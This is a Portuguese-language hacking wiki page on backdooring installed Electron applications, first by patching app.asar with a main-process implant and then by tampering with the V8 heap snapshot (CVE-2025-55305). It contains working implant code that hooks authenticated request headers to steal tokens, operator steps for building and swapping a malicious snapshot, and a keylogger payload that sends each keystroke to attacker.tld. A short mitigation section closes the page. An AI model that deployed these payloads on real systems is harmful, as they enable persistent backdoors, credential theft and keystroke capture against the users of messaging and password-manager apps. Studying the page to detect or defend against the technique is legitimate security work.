# Injeção Local de Código e Adulteração de Snapshot no Electron

{{#include ../../banners/hacktricks-training.md}}

## Injeção Local de Código no Electron

Se você puder modificar ou instrumentar um aplicativo Electron instalado localmente, talvez consiga fazê-lo executar JavaScript arbitrário. Veja:


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Para uma superfície local de depuração do Node inspector ou do Chromium DevTools, veja [abuso de depuração do Node inspector/CEF](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation: implantes no ASAR/processo principal

Se você obtiver **acesso de escrita** ao diretório de recursos de um aplicativo Electron, uma técnica de post-exploitation bastante prática é **aplicar um patch no `app.asar`** (ou no ponto de entrada JS que ele carrega) e aguardar o usuário reiniciar o aplicativo. Ao contrário de um XSS somente no renderer, o código carregado pelo **processo principal** é executado no **runtime do Node.js** do aplicativo, então geralmente pode acessar o **sistema de arquivos**, iniciar comandos, interceptar APIs do Electron e inspecionar o estado autenticado do aplicativo.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Fluxo de trabalho típico:

1. Extraia o `app.asar` e identifique o arquivo de inicialização real em `package.json` (`main`) ou na lógica de inicialização existente.
2. Adicione um pequeno loader no **processo principal** (ou um hook de preload/processo principal) e reempacote o arquivo.
3. Aguarde o aplicativo iniciar novamente e use o implante para capturar dados de runtime depois que o usuário desbloquear ou se autenticar no aplicativo desktop.

Exemplo mínimo de patch de bootstrap:

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Implicações práticas:

- **Roubo de dados de clientes confiáveis**: assim que o app desktop descriptografa ou carrega dados para o usuário, o implant pode lê-los em tempo de execução. É por isso que **clientes de mensagens E2EE** (Signal/Slack/Mattermost) e **gerenciadores de cofres/segredos** continuam sendo alvos interessantes na camada do endpoint.
- **Abuso de sessão/token**: implants de Electron podem roubar cookies do app, bearer tokens, cabeçalhos de requisição, arquivos do workspace ou credenciais de repositórios expostas ao cliente em execução (por exemplo, extensões autenticadas do VS Code ou integrações com Git).
- **Pivotamento pelo contexto da vítima**: um app modificado pode encaminhar requisições por meio da estação de trabalho da vítima, reutilizando o IP, a impressão digital TLS e a sessão do app da vítima, em vez de apenas exfiltrar tokens brutos.

> [!NOTE]
> Se o alvo habilitar **integridade do ASAR** / **OnlyLoadAppFromAsar** ou **fuses** reforçados do Electron, talvez seja necessário usar outra primitiva local de carregamento de código (por exemplo, abuso de fuse ou adulteração de snapshot). Consulte a página de injeção específica para macOS para mais opções de implants locais e detalhes sobre fuses.

## Backdoor local via adulteração do snapshot do heap do V8 (Electron/Chromium) – CVE-2025-55305

Apps baseados em Electron e Chromium desserializam um snapshot pré-compilado do heap do V8 na inicialização (v8_context_snapshot.bin e, opcionalmente, browser_v8_context_snapshot.bin) para inicializar cada isolate do V8 (main, preload, renderer). Historicamente, os fuses de integridade do Electron não tratavam esses snapshots como conteúdo executável, então eles escapavam tanto da aplicação de integridade baseada em fuses quanto das verificações de assinatura de código do sistema operacional. Como resultado, substituir o snapshot em uma instalação gravável pelo usuário permitia a execução furtiva e persistente de código dentro do app, sem modificar os binários assinados ou o ASAR.<sup>[[2]](#references)</sup>

Pontos principais
- Lacuna de integridade: EnableEmbeddedAsarIntegrityValidation e OnlyLoadAppFromAsar validam o JavaScript do app dentro do ASAR, mas não cobriam snapshots do heap do V8 (CVE-2025-55305). O Chromium também não verifica a integridade dos snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Pré-requisitos do ataque: Gravação local de arquivos no diretório de instalação do app. Isso é comum em sistemas onde apps Electron ou navegadores Chromium são instalados em caminhos graváveis pelo usuário (por exemplo, %AppData%\Local no Windows; /Applications, com ressalvas, no macOS).
- Efeito: Execução confiável de JavaScript do atacante em qualquer isolate, sobrescrevendo um builtin frequentemente usado (um “gadget”), permitindo persistência e evasão da verificação de assinatura de código.
- Superfície afetada: Apps Electron (mesmo com fuses habilitados) e navegadores baseados em Chromium que carregam snapshots de locais graváveis pelo usuário.

Gerar um snapshot malicioso sem compilar o Chromium
- Use o electron/mksnapshot pré-compilado para compilar um payload JS em um snapshot e sobrescrever o v8_context_snapshot.bin do app.<sup>[[5]](#references)[[6]](#references)</sup>

Exemplo de payload mínimo (provar a execução forçando uma falha)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Roteamento de payload com reconhecimento de isolate (executar código diferente no processo principal vs. no renderer)
- Detecção do processo principal: globais exclusivos do Node, como process.pid, process.binding() ou process.dlopen, estão presentes no isolate do processo principal.
- Detecção do browser/renderer: globais exclusivos do browser, como alert, estão disponíveis durante a execução em um contexto de documento.

Exemplo de gadget que verifica os recursos do Node no processo principal uma vez
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC de roubo de dados do contexto do Renderer/browser (por exemplo, Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Fluxo de trabalho do operador
1) Escreva payload.js que sobrescreva um builtin comum (por exemplo, Array.isArray) e, opcionalmente, tenha ramificações por isolate.
2) Crie o snapshot sem os fontes do Chromium:
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Substitua os arquivos de snapshot do aplicativo-alvo:
   - v8_context_snapshot.bin (sempre usado)
   - browser_v8_context_snapshot.bin (se o fuse LoadBrowserProcessSpecificV8Snapshot estiver habilitado)
4) Inicie o aplicativo; o gadget será executado sempre que o builtin escolhido for usado.

Observações e considerações
- Bypass de integridade/assinatura: os arquivos de snapshot não são tratados como executáveis nativos pelas verificações de code-signing e, historicamente, não eram cobertos pelos fuses do Electron nem pelos controles de integridade do Chromium.
- Persistência: substituir o snapshot em uma instalação gravável pelo usuário normalmente persiste após reinicializações do aplicativo e faz com que ele pareça um aplicativo legítimo e assinado.
- Navegadores Chromium: o mesmo conceito de adulteração se aplica ao Chrome e seus derivados instalados em locais graváveis pelo usuário. O Chrome tem outras mitigações de integridade, mas exclui explicitamente ataques locais físicos do seu modelo de ameaças.<sup>[[9]](#references)[[10]](#references)</sup>

Detecção e mitigações
- Trate os snapshots como conteúdo executável e inclua-os na aplicação das verificações de integridade (correção do CVE-2025-55305).
- Prefira locais de instalação graváveis somente por administradores; estabeleça uma referência e monitore os hashes de v8_context_snapshot.bin e browser_v8_context_snapshot.bin.
- Detecte a sobrescrita de builtins no início da execução e alterações inesperadas nos snapshots; gere alertas quando os snapshots desserializados não corresponderem aos valores esperados.

## References

- [1] [JS-Tap v3: Pós-exploração de endpoints com implantes JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Subvertendo verificações de integridade de código para inserir backdoors locais no Signal, 1Password, Slack e outros](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuses do Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Integridade do ASAR no Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Snapshots de inicialização personalizados do V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium: desabilitar o carregamento de código não assinado (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [FAQ de segurança do Chrome: ataques locais físicos fora do escopo](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
